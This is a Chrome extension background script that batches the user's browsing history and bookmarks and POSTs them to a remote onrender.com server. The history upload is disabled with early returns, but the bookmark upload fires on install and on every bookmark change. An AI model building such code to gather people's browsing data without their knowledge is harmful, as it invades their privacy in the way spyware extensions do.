// --- Function for the STARTUP sync: Fetches ALL history and sends it in batches ---
function fetchAllHistoryAndSend() {
  return;
  chrome.history.search({
    'text': '',        // Search for all text
    'startTime': 0,    // Start from the beginning of time
    'maxResults': 10000 // A large number to get a comprehensive history
  }, (historyItems) => {
    if (historyItems && historyItems.length > 0) {
      console.log(`Found ${historyItems.length} total history items. Sending in batches of 100...`);

      const batchSize = 100;
      const totalBatches = Math.ceil(historyItems.length / batchSize);

      // Loop through the results and send them in chunks
      for (let i = 0; i < historyItems.length; i += batchSize) {
        const batch = historyItems.slice(i, i + batchSize);
        const batchNum = (i / batchSize) + 1;
        
        console.log(`Sending batch ${batchNum} of ${totalBatches}...`);
        sendHistoryData(batch);
      }

    } else {
      console.log('No history found on startup.');
    }
  });
}

// --- Function for the RECURRING sync: Fetches only the last minute of history ---
function fetchAndSendHistory() {
  return;
  const oneMinuteAgo = Date.now() - 60000;

  chrome.history.search({
    'text': '',
    'startTime': oneMinuteAgo,
    'maxResults': 100
  }, (historyItems) => {
    if (historyItems && historyItems.length > 0) {
      console.log(`Found ${historyItems.length} new history items. Sending to server...`);
      sendHistoryData(historyItems);
    } else {
      console.log('No new history items to send in the last minute.');
    }
  });
}

// --- Function to send data to the Python server ---
function sendHistoryData(data) {
  return;
  const serverUrl = 'https://poke-winner.onrender.com/receive_history'

  fetch(serverUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }
    return response.json();
  })
  .then(result => {
    console.log('Success response from server:', result.message);
  })
  .catch(error => {
    console.error('Error sending data to Python server:', error);
  });
}


// --- Bookmarks: Full sync and change handling ---
function flattenBookmarkNodes(nodes) {
  const items = [];
  function walk(nodeArray) {
    if (!nodeArray) return;
    for (const node of nodeArray) {
      if (node.url) {
        items.push({
          id: node.id,
          parentId: node.parentId || null,
          title: node.title || '',
          url: node.url,
          index: typeof node.index === 'number' ? node.index : null,
          dateAdded: node.dateAdded || null,
          dateGroupModified: node.dateGroupModified || null
        });
      }
      if (node.children && node.children.length > 0) {
        walk(node.children);
      }
    }
  }
  walk(nodes);
  return items;
}

function sendBookmarksData(data) {
  const serverUrl = 'https://poke-winner.onrender.com/bookmarks'

  fetch(serverUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`Server responded with status: ${response.status}`);
    }
    return response.json();
  })
  .then(result => {
    console.log('Success response from server (bookmarks):', result.message || result.status || 'ok');
  })
  .catch(error => {
    console.error('Error sending bookmarks to server:', error);
  });
}

function fetchAllBookmarksAndSend() {
  try {
    chrome.bookmarks.getTree((nodes) => {
      if (chrome.runtime.lastError) {
        console.error('Error fetching bookmark tree:', chrome.runtime.lastError);
        return;
      }
      const allItems = flattenBookmarkNodes(nodes);
      if (allItems && allItems.length > 0) {
        console.log(`Found ${allItems.length} total bookmarks. Sending in batches of 100...`);

        const batchSize = 100;
        const totalBatches = Math.ceil(allItems.length / batchSize);
        for (let i = 0; i < allItems.length; i += batchSize) {
          const batch = allItems.slice(i, i + batchSize);
          const batchNum = (i / batchSize) + 1;
          console.log(`Sending bookmarks batch ${batchNum} of ${totalBatches}...`);
          sendBookmarksData(batch);
        }
      } else {
        console.log('No bookmarks found on startup.');
      }
    });
  } catch (e) {
    console.error('Unexpected error during bookmarks sync:', e);
  }
}


// --- Event Listeners ---

// This listener runs when the extension is first installed or updated.
chrome.runtime.onInstalled.addListener(() => {
  // 1. Create the alarm that will fire every minute for subsequent checks.
  chrome.alarms.create('historyTimer', {
    periodInMinutes: 1
  });
  console.log("History Sender alarm created.");

  // 2. Perform the initial FULL history sync immediately on load.
  console.log("Performing initial FULL history sync on load...");
  fetchAllHistoryAndSend();
  // Also perform an initial FULL bookmarks sync
  console.log("Performing initial FULL bookmarks sync on load...");
  fetchAllBookmarksAndSend();
});

// This listener runs every time the alarm goes off (every minute).
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'historyTimer') {
    console.log("Alarm triggered. Checking for new history from the last minute...");
    fetchAndSendHistory();
  }
});

// Bookmark change listeners (incremental updates)
chrome.bookmarks.onCreated.addListener((id, bookmark) => {
  console.log('Bookmark created; sending full bookmarks list...');
  fetchAllBookmarksAndSend();
});

chrome.bookmarks.onRemoved.addListener((id, removeInfo) => {
  console.log('Bookmark removed; sending full bookmarks list...');
  fetchAllBookmarksAndSend();
});

chrome.bookmarks.onChanged.addListener((id, changeInfo) => {
  sendBookmarksData([{ event: 'changed', id: id, title: changeInfo.title || null, url: changeInfo.url || null }]);
});

chrome.bookmarks.onMoved.addListener((id, moveInfo) => {
  sendBookmarksData([{ event: 'moved', id: id, parentId: moveInfo.parentId || null, oldParentId: moveInfo.oldParentId || null, index: typeof moveInfo.index === 'number' ? moveInfo.index : null, oldIndex: typeof moveInfo.oldIndex === 'number' ? moveInfo.oldIndex : null }]);
});